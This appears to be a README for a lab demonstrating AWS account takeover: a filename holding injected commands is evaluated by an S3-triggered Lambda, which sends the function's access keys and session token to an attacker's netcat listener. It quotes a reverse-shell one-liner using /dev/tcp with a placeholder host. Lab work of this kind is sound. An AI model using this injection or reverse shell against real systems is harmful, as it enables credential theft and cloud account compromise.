# Vulnerable AWS Account access through public S3 Buckets

- Public S3 buckets as a source to takeover an AWS Account

## Overview

1. Assume a S3 Public bucket is on the internet
2. A Lambda function is triggered when an object is uploaded to S3 that downloads and calculates the size of the file, then tags the object in s3 with the size value.
3. Attacker uploads a file, whose name has the commands that are malicious.
4. Lambda functions evaluates the command and sends the information such as Access Key, Secret Access Key and Session Token to the attacker's machine running netcat.
5. AWS Account is compromised.

## File Structure
- main.py
    - code that needs to be run on AWS Lambda
    - Runtime: Python 3.9
    - Role: S3FullAccess
- commands.sh
    - contains necessary shell commands to execute the exploit

- payload.py
    - contains the all payloads necessary and encodings

- acl.json
    - acl to be applied in s3 inorder to make it public
    - additionally "Block all public access" needs to be disabled as well

## Challenges faced
- Initially tried to perform POST request, but mostly it was failure, so then tried GET request with parameters.
- Lambda by default has no Curl command
- 'sh -i >& /dev/tcp/<ip-address>/<port> 0>&1' the defacto for reverse shell can be executed, but lambda wont persist and connection is dropped immediately
    - tried running an infinite loop to maximise the time accessing this method. facing some error.
    - threading might work, but trying to keep things simple here
- 'from botocore.vendored import requests' thought it might work, but no GET and POST functionality.


## References

[Vulnerable AWS Lambda function â€“ Initial access in cloud attacks](https://sysdig.com/blog/exploit-mitigate-aws-lambdas-mitre/)

[Fantastic! Public S3 Buckets and How to Find Them](https://auth0.com/blog/fantastic-public-s3-buckets-and-how-to-find-them/)

